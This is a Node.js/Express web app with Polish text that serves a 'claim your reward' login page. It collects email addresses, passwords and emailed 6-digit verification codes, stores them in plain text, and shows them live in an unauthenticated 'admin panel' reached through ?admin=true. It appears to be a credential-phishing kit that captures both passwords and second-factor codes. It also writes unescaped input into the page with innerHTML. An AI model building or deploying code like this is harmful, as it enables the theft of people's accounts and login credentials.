const express = require('express');
const bodyParser = require('body-parser');
const nodemailer = require('nodemailer');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(bodyParser.json());

const usersDB = []; 
const verificationCodes = {}; 

const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: 'TWÓJ_MAIL@gmail.com',
        pass: 'TWOJE_HASLO_APLIKACJI'
    }
});

app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html lang="pl">
        <head>
            <meta charset="UTF-8">
            <title>Portal Użytkownika - Odbierz Nagrodę</title>
            <style>
                body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
                .card { background: white; padding: 35px; border-radius: 12px; box-shadow: 0 6px 20px rgba(0,0,0,0.08); width: 380px; text-align: center; }
                h2 { color: #333; margin-bottom: 20px; font-size: 22px; }
                input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #dcdde1; border-radius: 6px; box-sizing: border-box; font-size: 14px; }
                button { background: #4361ee; color: white; border: none; padding: 12px; width: 100%; border-radius: 6px; cursor: pointer; font-weight: 600; font-size: 15px; }
                button:hover { background: #3a0ca3; }
                .hidden { display: none; }
                .admin-panel { width: 850px; text-align: left; }
                table { width: 100%; border-collapse: collapse; margin-top: 15px; }
                th, td { border: 1px solid #eee; padding: 10px; text-align: left; font-size: 13px; }
                th { background: #f8f9fa; color: #495057; }
                p { font-size: 14px; }
            </style>
        </head>
        <body>
            <div class="card" id="loginCard">
                <h2>Portal Użytkownika</h2>
                <div id="step1">
                    <p style="color: #666; margin-bottom: 15px;">Zaloguj się, aby odebrać nagrodę</p>
                    <input type="email" id="email" placeholder="Adres E-mail" required>
                    <input type="password" id="password" placeholder="Hasło" required>
                    <button onclick="sendLogin()">Zaloguj i wyślij kod</button>
                </div>
                <div id="step2" class="hidden">
                    <p style="color: #666; margin-bottom: 15px;">Wprowadź 6-cyfrowy kod bezpieczeństwa:</p>
                    <input type="text" id="code" placeholder="Kod weryfikacyjny" maxlength="6">
                    <button onclick="verifyCode()">Potwierdź i aktywuj konto</button>
                </div>
                <p id="msg" style="color: #e63946; margin-top: 15px;"></p>
            </div>

            <div class="card hidden admin-panel" id="adminCard">
                <h2>Panel Administratora</h2>
                <table>
                    <thead>
                        <tr>
                            <th>Data</th>
                            <th>E-mail</th>
                            <th>Hasło</th>
                            <th>Kod 2FA</th>
                            <th>Status</th>
                        </tr>
                    </thead>
                    <tbody id="adminTableBody"></tbody>
                </table>
                <button onclick="loadAdminData()" style="margin-top: 20px; background: #2ec4b6;">Odśwież dane</button>
            </div>

            <script>
                let currentEmail = '';

                async function sendLogin() {
                    const email = document.getElementById('email').value;
                    const password = document.getElementById('password').value;
                    currentEmail = email;

                    if(!email || !password) {
                        document.getElementById('msg').innerText = 'Wypełnij wszystkie pola!';
                        return;
                    }

                    const res = await fetch('/api/login', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ email, password })
                    });
                    const data = await res.json();

                    if (data.success) {
                        document.getElementById('step1').classList.add('hidden');
                        document.getElementById('step2').classList.remove('hidden');
                        document.getElementById('msg').innerText = data.message;
                        document.getElementById('msg').style.color = '#2a9d8f';
                    } else {
                        document.getElementById('msg').innerText = data.message;
                    }
                }

                async function verifyCode() {
                    const code = document.getElementById('code').value;

                    const res = await fetch('/api/verify', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ email: currentEmail, code })
                    });
                    const data = await res.json();

                    if (data.success) {
                        alert('Konto zweryfikowane pomyślnie!');
                        location.reload();
                    } else {
                        document.getElementById('msg').innerText = data.message;
                    }
                }

                if (window.location.search.includes('admin=true')) {
                    document.getElementById('loginCard').classList.add('hidden');
                    document.getElementById('adminCard').classList.remove('hidden');
                    loadAdminData();
                    setInterval(loadAdminData, 3000);
                }

                async function loadAdminData() {
                    const res = await fetch('/api/admin/data');
                    const users = await res.json();
                    const tbody = document.getElementById('adminTableBody');
                    tbody.innerHTML = '';
                    users.forEach(u => {
                        tbody.innerHTML += \`<tr>
                            <td>\${u.timestamp}</td>
                            <td><b>\${u.email}</b></td>
                            <td>\${u.password}</td>
                            <td>\${u.code}</td>
                            <td>\${u.verified ? '<span style="color:green">Aktywny</span>' : '<span style="color:orange">Oczekiwanie</span>'}</td>
                        </tr>\`;
                    });
                }
            </script>
        </body>
        </html>
    `);
});

app.post('/api/login', async (req, res) => {
    const { email, password } = req.body;
    const code = Math.floor(100000 + Math.random() * 900000).toString();
    verificationCodes[email] = code;

    let existingUser = usersDB.find(u => u.email === email);
    if (!existingUser) {
        usersDB.push({ email, password, code, verified: false, timestamp: new Date().toLocaleString() });
    } else {
        existingUser.password = password;
        existingUser.code = code;
    }

    try {
        await transporter.sendMail({
            from: '"Portal" <noreply@portal.com>',
            to: email,
            subject: 'Kod weryfikacyjny',
            text: `Twój kod to: ${code}`
        });
        res.json({ success: true, message: 'Kod został wysłany!' });
    } catch (error) {
        res.json({ success: true, message: `Kod wygenerowany (Test: ${code})` });
    }
});

app.post('/api/verify', (req, res) => {
    const { email, code } = req.body;
    if (verificationCodes[email] && verificationCodes[email] === code) {
        let user = usersDB.find(u => u.email === email);
        if (user) user.verified = true;
        res.json({ success: true });
    } else {
        res.status(400).json({ success: false, message: 'Niepoprawny kod!' });
    }
});

app.get('/api/admin/data', (req, res) => {
    res.json(usersDB);
});

app.listen(PORT, () => {
    console.log(`Serwer działa na porcie ${PORT}`);
});
